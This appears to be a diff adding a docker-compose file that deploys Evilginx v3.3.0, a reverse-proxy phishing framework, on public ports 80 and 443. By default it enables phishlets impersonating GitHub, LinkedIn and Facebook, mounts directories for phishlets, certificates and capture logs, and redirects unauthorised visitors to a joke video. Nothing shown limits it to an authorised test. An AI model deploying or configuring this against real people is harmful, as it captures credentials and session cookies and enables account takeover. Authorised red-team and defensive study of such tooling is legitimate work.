@@ -1,0 +1,47 @@
+version: '3.8'
+
+services:
+  evilginx:
+    build:
+      context: .
+      args:
+        EVILGINX_TAG: v3.3.0
+    image: evilginx:latest
+    container_name: evilginx
+    restart: unless-stopped
+
+    ports:
+      - "0.0.0.0:443:443/tcp"
+      - "0.0.0.0:80:80/tcp"
+      # DNS port 53 - uncomment if needed
+      # - "0.0.0.0:53:53/udp"
+
+    volumes:
+      - ./config/evilginx/phishlets:/config/phishlets:ro
+      - ./config/evilginx/certs:/config/certs
+      - ./logs/evilginx:/config/logs
+
+    environment:
+      - EVILGINX_DOMAIN=${EVILGINX_DOMAIN}
+      - EVILGINX_EXTERNAL_IPV4=${EVILGINX_EXTERNAL_IPV4}
+      - EVILGINX_BIND_IPV4=0.0.0.0
+      - EVILGINX_DNS_PORT=53
+      - EVILGINX_HTTPS_PORT=443
+      - EVILGINX_HTTP_PORT=80
+      - EVILGINX_UNAUTH_URL=https://www.youtube.com/watch?v=dQw4w9WgXcQ
+      - EVILGINX_ENABLE_PHISHLETS=${EVILGINX_ENABLE_PHISHLETS:-github,linkedin,facebook}
+      - EVILGINX_DEVELOPER=${EVILGINX_DEVELOPER:-false}
+      - EVILGINX_DEBUG=${EVILGINX_DEBUG:-false}
+      - EVILGINX_LOG_FILE=/config/logs/evilginx.log
+
+    cap_drop:
+      - ALL
+    security_opt:
+      - no-new-privileges:true
+
+    healthcheck:
+      test: ["CMD", "sh", "-c", "kill -0 $$(cat /tmp/evilginx.pid 2>/dev/null) 2>/dev/null || pgrep -f evilginx >/dev/null"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      
